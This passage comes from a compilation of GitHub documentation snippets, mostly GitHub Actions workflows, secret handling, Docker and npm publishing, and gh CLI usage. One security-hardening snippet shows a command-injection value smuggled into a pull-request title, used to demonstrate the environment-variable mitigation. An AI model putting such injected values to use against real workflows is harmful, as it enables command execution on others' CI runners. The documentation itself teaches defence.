 The script then uses this variable. This approach prevents the direct insertion of untrusted data into the shell script, isolating the value and preventing code execution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Check PR title\n        env:\n          TITLE: {% raw %}${{ github.event.pull_request.title }}{% endraw %}\n        run: |\n          if [[ \"$TITLE\" =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n----------------------------------------\n\nTITLE: Installing ARC Runner Scale Set using Helm\nDESCRIPTION: This bash script demonstrates how to install an Actions Runner Controller (ARC) runner scale set using Helm.  It sets environment variables for the installation name, namespace, GitHub configuration URL, and GitHub personal access token. The `helm install` command then uses these variables to deploy the runner scale set. The GitHub token is stored as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/using-actions-runner-controller-runners-in-a-workflow.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Using a {% data variables.pat_generic_title_case %} (PAT)\nINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution Based on Secret Value\nDESCRIPTION: This YAML snippet demonstrates conditional step execution based on the presence of a secret. It sets the secret as a job-level environment variable and uses `if` to check if the environment variable has a value, running different steps accordingly.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nname: Run a step if a secret has been set\non: push\njobs:\n  my-jobname:\n    runs-on: ubuntu-latest\n    env:\n      super_secret: ${{ secrets.SuperSecret }}\n    steps:\n      - if: ${{ env.super_secret != '' }}\n        run: echo 'This step will only run if the secret has a value set.'\n      - if: ${{ env.super_secret == '' }}\n        run: echo 'This step will only run if the secret does not have a value set.'\n```\n\n----------------------------------------\n\nTITLE: Defining Recommended Secrets in devcontainer.json (JSON)\nDESCRIPTION: This code snippet demonstrates how to define recommended secrets within the `devcontainer.json` file. It includes optional descriptions and documentation URLs for each secret. The `secrets` property is added at the top level of the JSON object.  Users are prompted to create these secrets when creating a codespace with advanced options.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/configuring-dev-containers/specifying-recommended-secrets-for-a-repository.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"secrets\": {\n     \"NAME_OF_SECRET_1\": {\n       \"description\": \"This is the description of the secret.\",\n       \"documentationUrl\": \"https://example.com/link/to/info\"\n     },\n     \"NAME_OF_SECRET_2\": { }\n   }\n```\n\n----------------------------------------\n\nTITLE: Linting PowerShell Code with PSScriptAnalyzer (YAML)\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to lint PowerShell code using the `PSScriptAnalyzer` module. It installs the module from the PowerShell Gallery, then invokes the analyzer on all `.ps1` files in the repository, reporting errors and warnings. The workflow fails if any errors are found.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nlint-with-PSScriptAnalyzer:\n    name: Install and run PSScriptAnalyzer\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Lint with PSScriptAnalyzer\n        shell: pwsh\n        run: |\n          Invoke-ScriptAnalyzer -Path *.ps1 -Recurse -Outvariable issues\n          $errors   = $issues.Where({$_.Severity -eq 'Error'})\n          $warnings = $issues.Where({$_.Severity -eq 'Warning'})\n          if ($errors) {\n              Write-Error \"There were $($errors.Count) errors and $($warnings.Count) warnings total.\" -ErrorAction Stop\n          } else {\n              Write-Output \"There were $($errors.Count) errors and $($warnings.Count) warnings total.\"\n          }\n```\n\n----------------------------------------\n\nTITLE: Maven CI Workflow Definition\nDESCRIPTION: This workflow defines a CI process for Java projects using Maven. It triggers on push events to the `main` branch and pull requests targeting the `main` branch. The workflow sets up a JDK environment, builds the project using Maven, and optionally uploads the dependency graph for improved Dependabot alerts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Java CI with Maven\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set up JDK 17\n      uses: {% data reusables.actions.action-setup-java %}\n      with:\n        java-version: '17'\n        distribution: 'temurin'\n        cache: maven\n    - name: Build with Maven\n      run: mvn -B package --file pom.xml\n\n    # Optional: Uploads the full dependency graph to GitHub to improve the quality of Dependabot alerts this repository can receive\n    - name: Update dependency graph\n      uses: advanced-security/maven-dependency-submission-action@571e99aab1055c2e71a1e2309b9691de18d6b7d6\n```\n\n----------------------------------------\n\nTITLE: Publishing Docker Image Workflow\nDESCRIPTION: This workflow builds and pushes a Docker image to the GitHub Container Registry (ghcr.io). It uses the GITHUB_TOKEN for authentication and is triggered on pushes to the `main` or `seed` branches, tag creation starting with `v`, or pull requests. The image is tagged with the git ref and pushed to the registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/managing-github-packages-using-github-actions-workflows/publishing-and-installing-a-package-with-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n#\nname: Demo Push\n\n# This workflow runs when any of the following occur:\n# - A push is made to a branch called `main` or `seed`\n# - A tag starting with \"v\" is created\n# - A pull request is created or updated\non:\n  push:\n    branches:\n      - main\n      - seed\n    tags:\n      - v*\n  pull_request:\n  # This creates an environment variable called `IMAGE_NAME ` with the value `ghtoken_product_demo`.\nenv:\n  IMAGE_NAME: ghtoken_product_demo\n#\njobs:\n  # This pushes the image to {% data variables.product.prodname_registry %}.\n  push:\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n      #\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Build image\n        run: docker build . --file Dockerfile --tag $IMAGE_NAME --label \"runnumber=${GITHUB_RUN_ID}\"\n\n      - name: Log in to registry\n        run: echo \"{% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\" | docker login ghcr.io -u {% raw %}${{ github.actor }}{% endraw %} --password-stdin\n        #\n      - name: Push image\n        run: |\n          IMAGE_ID=ghcr.io/{% raw %}${{ github.repository_owner }}{% endraw %}/$IMAGE_NAME\n\n          # This changes all uppercase characters to lowercase.\n          IMAGE_ID=$(echo $IMAGE_ID | tr '[A-Z]' '[a-z]')\n          # This strips the git ref prefix from the version.\n          VERSION=$(echo \"{% raw %}${{ github.ref }}{% endraw %}\" | sed -e 's,.*/\\(.*\\),\\1,')\n          # This strips the \"v\" prefix from the tag name.\n          [[ \"{% raw %}${{ github.ref }}{% endraw %}\" == \"refs/tags/\"* ]] && VERSION=$(echo $VERSION | sed -e 's/^v//')\n          # This uses the Docker `latest` tag convention.\n          [ \"$VERSION\" == \"main\" ] && VERSION=latest\n          echo IMAGE_ID=$IMAGE_ID\n          echo VERSION=$VERSION\n          docker tag $IMAGE_NAME $IMAGE_ID:$VERSION\n          docker push $IMAGE_ID:$VERSION\n```\n\n----------------------------------------\n\nTITLE: Adding Title and Body to Pull Request using gh CLI\nDESCRIPTION: This snippet shows how to include a title and body for a pull request using the `--title` and `--body` flags with the `gh pr create` command. The title provides a brief description, and the body contains more detailed information.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --title \"The bug is fixed\" --body \"Everything works again\"\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Key using GitHub CLI\nDESCRIPTION: This snippet shows how to add an SSH key to your GitHub account using the `gh ssh-key add` command. The `--type` flag specifies whether the key is for authentication or signing. The `KEY-FILE` argument specifies the path to your public key file.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh ssh-key add KEY-FILE --type {authentication|signing}\n```\n\n----------------------------------------\n\nTITLE: Defining inputs and outputs in action.yml (YAML)\nDESCRIPTION: This snippet demonstrates how to define inputs and outputs in an `action.yml` file for a GitHub Action.  Inputs define data required by the action, and outputs define data produced by the action. This example shows a required `file-path` input with a default value and a `results-file` output.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Example\"\ndescription: \"Receives file and generates output\"\ninputs:\n  file-path: # id of input\n    description: \"Path to test script\"\n    required: true\n    default: \"test-file.js\"\noutputs:\n  results-file: # id of output\n    description: \"Path to results file\"\n```\n\n----------------------------------------\n\nTITLE: Caching Dependencies in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet shows how to cache dependencies in a GitHub Actions workflow to improve performance. It utilizes an action to cache the `~/.npm` directory. The `key` is dynamically generated based on the runner's OS, a cache name, and the hash of the `package-lock.json` file. `restore-keys` are provided for partial cache matches.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example-job:\n    steps:\n      - name: Cache node modules\n        uses: {% data reusables.actions.action-cache %}\n        env:\n          cache-name: cache-node-modules\n        with:\n          path: ~/.npm\n          key: {% raw %}${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n          restore-keys: |\n            {% raw %}${{ runner.os }}-build-${{ env.cache-name }}-{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Running tests with tox\nDESCRIPTION: This snippet configures a workflow to run tests with tox across multiple Python versions using a matrix strategy.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python: [\"3.9\", \"3.11\", \"3.13\"]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Python\n        uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: {% raw %}${{ matrix.python }}{% endraw %}\n      - name: Install tox and any other packages\n        run: pip install tox\n      - name: Run tox\n        # Run tox using the version of Python in `PATH`\n        run: tox -e py\n```\n\n----------------------------------------\n\nTITLE: Converting Environment Variables with fromJSON in GitHub Actions\nDESCRIPTION: This YAML workflow uses the `fromJSON` function to convert environment variables (defined as strings) into Boolean and Integer types. This allows the values to be used directly as configuration settings for step options such as `continue-on-error` and `timeout-minutes`. The `fromJSON` function parses the string representation of the boolean and integer values stored in env variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: print\non: push\nenv:\n  continue: true\n  time: 3\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    steps:\n      - continue-on-error: {% raw %}${{ fromJSON(env.continue) }}{% endraw %}\n        timeout-minutes: {% raw %}${{ fromJSON(env.time) }}{% endraw %}\n        run: echo ...\n```\n\n----------------------------------------\n\nTITLE: Cache .NET dependencies\nDESCRIPTION: This workflow demonstrates caching NuGet dependencies for faster builds. It uses the `cache` input of the `setup-dotnet` action to cache the NuGet global-packages folder. The `Newtonsoft.Json` package is then installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Setup dotnet\n  uses: {% data reusables.actions.action-setup-dotnet %}\n  with:\n    dotnet-version: '6.x'\n    cache: true\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1\n```\n\n----------------------------------------\n\nTITLE: Build and Deploy .NET to Azure Web App - YAML\nDESCRIPTION: This workflow builds and deploys an ASP.Net Core application to an Azure Web App upon pushes to the `main` branch. It sets up the .NET Core environment, caches dependencies for faster builds, builds and publishes the application, uploads the artifact, and then deploys it to Azure using the `azure/webapps-deploy` action.  Environment variables such as `AZURE_WEBAPP_NAME`, `AZURE_WEBAPP_PACKAGE_PATH`, and `DOTNET_VERSION` must be appropriately configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-net-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and deploy ASP.Net Core app to an Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  DOTNET_VERSION: '5'                 # set this to the .NET Core version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Set up .NET Core\n        uses: {% data reusables.actions.action-setup-dotnet %}\n        with:\n          dotnet-version: {% raw %}${{ env.DOTNET_VERSION }}{% endraw %}\n\n      - name: Set up dependency caching for faster builds\n        uses: {% data reusables.actions.action-cache %}\n        with:\n          path: ~/.nuget/packages\n          key: {% raw %}${{ runner.os }}-nuget-${{ hashFiles('**/packages.lock.json') }}{% endraw %}\n          restore-keys: |\n            {% raw %}${{ runner.os }}-nuget-{% endraw %}\n\n      - name: Build with dotnet\n        run: dotnet build --configuration Release\n\n      - name: dotnet publish\n        run: dotnet publish -c Release -o {% raw %}${{env.DOTNET_ROOT}}{% endraw %}/myapp\n\n      - name: Upload artifact for deployment job\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: .net-app\n          path: {% raw %}${{env.DOTNET_ROOT}}{% endraw %}/myapp\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n      - name: Download artifact from build job\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: .net-app\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n          publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n          package: {% raw %}${{ env.AZURE_WEBAPP_PACKAGE_PATH }}{% endraw %}\n\n```\n\n----------------------------------------\n\nTITLE: Log Output: Environment Variable Mitigation - Shell\nDESCRIPTION: This shell snippet shows the log output when using an environment variable to prevent script injection.  The `TITLE` environment variable contains the potentially malicious input, but it is not executed as a command. The log shows that the attempted injection was unsuccessful and the `ls` command wasn't executed, demonstrating that the environment variable approach effectively mitigates the risk.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n   env:\n     TITLE: a\"; ls $GITHUB_WORKSPACE\"\nPR title did not start with 'octocat'\n```\n\n----------------------------------------\n\nTITLE: Encoding a file to Base64 (macOS)\nDESCRIPTION: This command encodes a file named `cert.der` into a Base64 string and saves it to a file named `cert.base64`. This is useful for storing small binary blobs as secrets in GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\nbase64 -i cert.der -o cert.base64\n```\n\n----------------------------------------\n\nTITLE: Using secrets in GitHub Actions workflow\nDESCRIPTION: This YAML snippet demonstrates how to use secrets within a GitHub Actions workflow. Secrets are accessed using the `secrets` context. They can be used as input to actions or as environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Hello world action\n    with: # Set the secret as an input\n      super_secret: ${{ secrets.SuperSecret }}\n    env: # Or as an environment variable\n      super_secret: ${{ secrets.SuperSecret }}\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Adding PR to Project using GitHub App\nDESCRIPTION: This workflow automatically adds a pull request to a specified organization project when the pull request is marked as 'ready for review'. It uses a GitHub App for authentication. The workflow retrieves project data, sets the 'Status' field to 'Todo', and populates a custom 'Date posted' field with the current date. Requires a GitHub App with read and write permissions to organization projects, pull requests, and issues. Replace placeholders for APP_ID, APP_PEM, YOUR_ORGANIZATION, and YOUR_PROJECT_NUMBER with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n#\nname: Add PR to project\n# This workflow runs whenever a pull request in the repository is marked as \"ready for review\".\non:\n  pull_request:\n    types:\n      - ready_for_review\njobs:\n  track_pr:\n    runs-on: ubuntu-latest\n    steps:\n    # Uses the [actions/create-github-app-token](https://github.com/marketplace/actions/create-github-app-token) action to generate an installation access token for your app from the app ID and private key. The installation access token is accessed later in the workflow as `{% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}`.\n    #\n    # Replace `APP_ID` with the name of the configuration variable that contains your app ID.\n    #\n    # Replace `APP_PEM` with the name of the secret that contains your app private key.\n      - name: Generate token\n        id: generate-token\n        uses: actions/create-github-app-token@v1\n        with:\n          app-id: {% raw %}${{ vars.APP_ID }}{% endraw %}\n          private-key: {% raw %}${{ secrets.APP_PEM }}{% endraw %}\n      # Sets environment variables for this step.\n      #\n      # Replace `YOUR_ORGANIZATION` with the name of your organization. For example, `octo-org`.\n      #\n      # Replace `YOUR_PROJECT_NUMBER` with your project number. To find the project number, look at the project URL. For example, `https://github.com/orgs/octo-org/projects/5` has a project number of 5.\n      - name: Get project data\n        env:\n          GH_TOKEN: {% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}\n          ORGANIZATION: YOUR_ORGANIZATION\n          PROJECT_NUMBER: YOUR_PROJECT_NUMBER\n        # Uses [{% data variables.product.prodname_cli %}](https://cli.github.com/manual/) to query the API for the ID of the project and return the name and ID of the first 20 fields in the project. `fields` returns a union and the query uses inline fragments (`... on`) to return information about any `ProjectV2Field` and `ProjectV2SingleSelectField` fields. The response is stored in a file called `project_data.json`.\n        run: |\n          gh api graphql -f query='\n            query($org: String!, $number: Int!) {\n              organization(login: $org){\n                projectV2(number: $number) {\n                  id\n                  fields(first:20) {\n                    nodes {\n                      ... on ProjectV2Field {\n                        id\n                        name\n                      }\n                      ... on ProjectV2SingleSelectField {\n                        id\n                        name\n                        options {\n                          id\n                          name\n                        }\n                      }\n                    }\n                  }\n                }\n              }\n            }' -f org=$ORGANIZATION -F number=$PROJECT_NUMBER > project_data.json\n\n          # Parses the response from the API query and stores the relevant IDs as environment variables. Modify this to get the ID for different fields or options. For example:\n          #\n          # - To get the ID of a field called `Team`, add `echo 'TEAM_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Team\") | .id' project_data.json) >> $GITHUB_ENV`.\n          # - To get the ID of an option called `Octoteam` for the `Team` single select field, add `echo 'OCTOTEAM_OPTION_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Team\") |.options[] | select(.name==\"Octoteam\") |.id' project_data.json) >> $GITHUB_ENV`.\n          #\n          # **Note:** This workflow assumes that you have a project with a single select field called \"Status\" that includes an option called \"Todo\" and a date field called \"Date posted\". You must modify this section to match the fields that are present in your table.\n\n          echo 'PROJECT_ID='$(jq '.data.organization.projectV2.id' project_data.json) >> $GITHUB_ENV\n          echo 'DATE_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Date posted\") | .id' project_data.json) >> $GITHUB_ENV\n          echo 'STATUS_FIELD_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Status\") | .id' project_data.json) >> $GITHUB_ENV\n          echo 'TODO_OPTION_ID='$(jq '.data.organization.projectV2.fields.nodes[] | select(.name== \"Status\") | .options[] | select(.name==\"Todo\") |.id' project_data.json) >> $GITHUB_ENV\n\n```\n\n----------------------------------------\n\nTITLE: Encrypting a file using gpg\nDESCRIPTION: This command encrypts a file using `gpg` with the AES256 cipher. The encrypted file will have a `.gpg` extension. This method allows storing secrets larger than 48KB by storing the encrypted file in the repository and the decryption passphrase as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\ngpg --symmetric --cipher-algo AES256 my_secret.json\n```\n\n----------------------------------------\n\nTITLE: Using Versioned Actions\nDESCRIPTION: This YAML snippet demonstrates various ways to specify the version of a GitHub Action using the `uses` keyword.  It shows referencing a specific commit, the major version of a release, a specific version number, and a branch. Using explicit versions is recommended for stability.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  # Reference a specific commit\n  - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n  # Reference the major version of a release\n  - uses: {% data reusables.actions.action-checkout %}\n  # Reference a specific version\n  - uses: {% data reusables.actions.action-checkout %}.2.0\n  # Reference a branch\n  - uses: actions/checkout@main\n```\n\n----------------------------------------\n\nTITLE: Enabling Manual Workflow Dispatch\nDESCRIPTION: This YAML snippet enables manual triggering of a workflow using the `workflow_dispatch` event.  This configuration allows users to manually trigger a workflow run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_52\n\nLANGUAGE: YAML\nCODE:\n```\non: workflow_dispatch\n```\n\n----------------------------------------\n\nTITLE: Checking References to a Commit\nDESCRIPTION: These commands check for existing references to a specific commit within a repository. The first command checks the main repository, while the second checks its network (forks). COMMIT_SHA_NUMBER needs to be replaced by the actual commit SHA.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo OWNER/REPOSITORY -c 'git ref-contains COMMIT_SHA_NUMBER'\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo OWNER/REPOSITORY -c 'cd ../network.git && git ref-contains COMMIT_SHA_NUMBER'\n```\n\n----------------------------------------\n\nTITLE: Authenticating Docker with PAT\nDESCRIPTION: This command authenticates Docker with the GitHub Packages registry using a personal access token (PAT). It reads the PAT from a file and passes it to Docker via stdin for secure authentication. The username is also required for login.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncat ~/TOKEN.txt | docker login https://docker.pkg.github.com -u USERNAME --password-stdin\n```\n\n----------------------------------------\n\nTITLE: Publish Package to npmjs Workflow\nDESCRIPTION: This workflow publishes a Node.js package to the npm registry when a release is published. It uses the `setup-node` action to configure Node.js and sets up authentication using a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    {% ifversion artifact-attestations %}permissions:\n      contents: read\n      id-token: write{% endif %}\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to npm\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n      - run: npm ci\n      - run: npm publish {% ifversion artifact-attestations %}--provenance --access public{% endif %}\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.NPM_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Commenting on Issues using GitHub CLI in GitHub Actions\nDESCRIPTION: This workflow configuration uses the `gh issue comment` subcommand to add a comment to an issue when it is opened. It requires setting the `GH_TOKEN` and `ISSUE` environment variables to authenticate and specify the target issue. The `GH_TOKEN` is sourced from the secrets, and the `ISSUE` URL is extracted from the GitHub event context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-github-cli-in-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Comment when opened\non:\n  issues:\n    types:\n      - opened\njobs:\n  comment:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh issue comment $ISSUE --body \"Thank you for opening this issue!\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          ISSUE: {% raw %}${{ github.event.issue.html_url }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Defining Secrets in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to define a secret as an environment variable within a GitHub Actions workflow. The `secrets.SUPERSECRET` syntax is used to reference a secret stored in the repository's settings. This allows you to use sensitive information without hardcoding it in the workflow file. The secret is then used as a parameter to an example command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Retrieve secret\n        env:\n          super_secret: ${{ secrets.SUPERSECRET }}\n        run: |\n          example-command \"$super_secret\"\n```\n\n----------------------------------------\n\nTITLE: Example: Generating Multiline Markdown Job Summary in Bash\nDESCRIPTION: This YAML configuration generates a multiline markdown list for a job summary.  Each line is appended to `$GITHUB_STEP_SUMMARY`. Blank lines can be inserted by appending an empty string.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_46\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Generate list using Markdown\n  run: |\n    echo \"This is the lead in sentence for the list\" >> $GITHUB_STEP_SUMMARY\n    echo \"\" >> $GITHUB_STEP_SUMMARY # this is a blank line\n    echo \"- Lets add a bullet point\" >> $GITHUB_STEP_SUMMARY\n    echo \"- Lets add a second bullet point\" >> $GITHUB_STEP_SUMMARY\n    echo \"- How about a third one?\" >> $GITHUB_STEP_SUMMARY\n\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent and Adding Default Key\nDESCRIPTION: Starts the SSH agent in the background and adds the default SSH key (`~/.ssh/id_rsa`) to the agent. It prompts for the passphrase if the key is encrypted.  The `eval \"$(ssh-agent -s)\"` command is used to properly initialize the SSH agent environment variables. The `ssh-add` command adds the key to the agent.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-agent-admitted-failure-to-sign.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n# start the ssh-agent in the background\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n$ ssh-add\n> Enter passphrase for /home/YOU/.ssh/id_rsa: [tippy tap]\n> Identity added: /home/YOU/.ssh/id_rsa (/home/YOU/.ssh/id_rsa)\n```\n\n----------------------------------------\n\nTITLE: Reporting Open Issues via GitHub CLI and GitHub Actions\nDESCRIPTION: This workflow uses the `gh api` subcommand to query the GraphQL API for the number of open issues in a repository. It then uses the `gh issue create` subcommand to create a new issue reporting the number of remaining open issues. The workflow uses environment variables for authentication, repository owner, and repository name. The `cron` schedule triggers the job daily.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-github-cli-in-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Report remaining open issues\non: \n  schedule: \n    # Daily at 8:20 UTC\n    - cron: '20 8 * * *'\njobs:\n  track_pr:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          numOpenIssues=\"$(gh api graphql -F owner=$OWNER -F name=$REPO -f query='\\n            query($name: String!, $owner: String!) {\\n              repository(owner: $owner, name: $name) {\\n                issues(states:OPEN){\\n                  totalCount\\n                }\\n              }\\n            }\\n          ' --jq '.data.repository.issues.totalCount')\"\n\n          echo 'NUM_OPEN_ISSUES='$numOpenIssues >> $GITHUB_ENV\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          